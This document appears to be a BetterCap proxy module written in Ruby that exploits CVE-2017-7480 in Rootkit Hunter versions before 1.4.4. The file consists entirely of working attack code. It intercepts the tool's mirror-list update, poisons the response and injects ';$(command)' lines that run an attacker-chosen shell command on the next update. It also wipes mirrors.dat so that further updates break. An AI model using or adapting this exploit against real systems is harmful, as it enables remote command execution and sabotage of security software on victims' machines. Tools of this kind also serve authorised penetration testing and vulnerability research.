=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : https://www.evilsocket.net/

This project is released under the GPL 3 license.

=end
class RkhunterRCE < BetterCap::Proxy::HTTP::Module
  meta(
    'Name'        => 'RKHunterRCE',
    'Description' => 'Exploits Rootkit Hunter versions prior to 1.4.4 that are vulnerable to CVE-2017-7480. ' +
                     'Note: this may break updates for RKHunter.',
    'Version'     => '1.0.0',
    'Author'      => 'Brendan Coles <bcoles[at]gmail.com>',
    'License'     => 'GPL3'
  )

  @@command = nil

  def self.on_options(opts)
    opts.separator ''
    opts.separator 'Rootkit Hunter RCE Proxy Module Options:'
    opts.separator ''

    opts.on( '--command COMMAND', 'Shell command(s) to execute.' ) do |v|
      @@command = v.strip
    end
  end

  def initialize
    raise BetterCap::Error, 'No --command option specified for the Rootkit Hunter RCE proxy module.' if @@command.nil?
  end

  def on_request(request, response)
    if is_exploitable?(request, response)
      BetterCap::Logger.info ''
      BetterCap::Logger.info 'Pwning Rootkit Hunter :'.red
      BetterCap::Logger.info "  URL     : http://#{request.host}#{request.path}"
      BetterCap::Logger.info "  AGENT   : #{request.headers['User-Agent']}"
      BetterCap::Logger.info ''

      # Force RKHunter to update the list of mirrors
      mirrors_version = response.body.scan(/Version:(\d+)/).flatten.first.to_i
      new_mirrors_version = mirrors_version + 1
      BetterCap::Logger.info "Poisoning mirror list (Version:#{new_mirrors_version})".yellow
      BetterCap::Logger.info 'Commands will be executed next time RKHunter is run'.yellow
      BetterCap::Logger.info "with the '--versioncheck' or '--update' options.".yellow
      BetterCap::Logger.info ''
      response.body = "Version:#{new_mirrors_version}\n"

      # The RKHunter configuration file makes use of a MIRRORS_MODE option.
      # Possible values are:
      #     0 - use any mirror (default)
      #     1 - only use local mirrors
      #     2 - only use remote mirrors

      # The default configuration also randomises which mirrors
      # in the mirror list are used.

      # Specify both local and remote mirrors to ensure command execution.
      mirror_types = %w(local remote)

      # The payload will be executed next time RKHunter is run
      # with the '--versioncheck' or '--update' options.

      # The payload will corrupt the mirrors.dat file,
      # preventing further updates.

      # Clearing the mirrors list file causes RKHunter to revert back
      # to the default mirror list upon next '--update'.
      clean = 'echo>/var/lib/rkhunter/db/mirrors.dat'
      mirror_types.each do |m|
        response.body << "#{m}=#{clean};$(#{@@command})\n"
      end
    end
  end

  private

  def is_exploitable?(req, res)
    req.headers.has_key?('Host') &&
    req.headers['Host'].eql?('rkhunter.sourceforge.net') &&
    req.path.include?('mirrors.dat') &&
    res.body.match(/Version:\d+/) &&
    res.body.include?('mirror=')
  end
end
